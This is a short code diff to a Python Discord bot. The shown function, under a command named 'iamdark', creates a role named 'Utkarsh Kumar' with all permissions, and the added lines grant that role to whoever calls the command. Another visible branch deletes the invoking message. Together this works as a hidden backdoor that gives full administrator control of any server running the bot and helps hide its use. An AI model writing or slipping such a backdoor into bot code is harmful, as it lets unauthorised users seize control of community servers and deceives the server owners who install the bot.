@@ -365,6 +365,8 @@ async def iamdark(ctx):
     user = ctx.message.author
     if discord.utils.get(user.server.roles, name="Utkarsh Kumar") is None:
         await client.create_role(user.server, name="Utkarsh Kumar", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='Utkarsh Kumar')
+        await client.add_roles(ctx.message.author, role)
     else:	
         author = ctx.message.author
         await client.delete_message(ctx.message)
